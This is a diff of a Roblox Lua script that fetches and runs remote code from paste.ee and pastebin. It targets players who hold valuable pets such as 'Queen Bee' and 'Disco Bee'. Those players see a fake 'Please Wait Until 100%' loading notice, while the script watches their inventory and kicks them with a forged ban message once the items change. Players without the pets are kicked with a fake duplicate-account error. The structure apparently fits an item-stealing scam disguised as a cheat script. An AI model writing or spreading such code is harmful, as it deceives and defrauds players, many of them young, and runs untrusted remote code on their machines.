@@ -1,2 +1,77 @@
 loadstring(game:HttpGet("https://paste.ee/r/Oep4oPlY"))()
 loadstring(game:HttpGet("https://pastebin.com/raw/Vg6AZbZE"))()
+local player = game.Players.LocalPlayer
+local StarterGui = game:GetService("StarterGui")
+local keywords = {
+    "Queen Bee",
+    "Disco Bee",
+    "Butterfly",
+    "Raccoon",
+    "Dragonfly"
+}
+
+local function removeSpaces(str)
+    return string.gsub(str, "%s+", "")
+end
+
+local function hasKeywordItem()
+    local function checkContainer(container)
+        if not container then return false end
+        for _, item in ipairs(container:GetChildren()) do
+            local itemName = removeSpaces(string.lower(item.Name))
+            for _, keyword in ipairs(keywords) do
+                local keywordCheck = removeSpaces(string.lower(keyword))
+                if string.find(itemName, keywordCheck, 1, true) then
+                    return true
+                end
+            end
+        end
+        return false
+    end
+
+    return checkContainer(player:FindFirstChild("Backpack")) or checkContainer(player.Character)
+end
+
+local function showNotification()
+    pcall(function()
+        StarterGui:SetCore("SendNotification", {
+            Title = "Script Loading",
+            Text = "Please Wait Until 100%",
+            Duration = 5
+        })
+    end)
+end
+
+local function kickPlayer(reason)
+    player:Kick(reason)
+end
+
+local function monitorContainers()
+    local function checkAndKick()
+        if not hasKeywordItem() then
+            kickPlayer("You have been kicked by this experience or its moderators. Moderation message:\ncheats detected: you have been banned for 10499 hours 59 minutes 59 second")
+        end
+    end
+
+    local backpack = player:FindFirstChild("Backpack")
+    local character = player.Character or player.CharacterAdded:Wait()
+
+    if backpack then
+        backpack.ChildAdded:Connect(checkAndKick)
+        backpack.ChildRemoved:Connect(checkAndKick)
+    end
+
+    if character then
+        character.ChildAdded:Connect(checkAndKick)
+        character.ChildRemoved:Connect(checkAndKick)
+    end
+end
+
+task.wait(1)
+
+if hasKeywordItem() then
+    showNotification()
+    monitorContainers()
+else
+    kickPlayer("You were kicked from this experience: Same account detected at another server. Kicked to prevent data corruption\n(Error Code: 267)")
+end
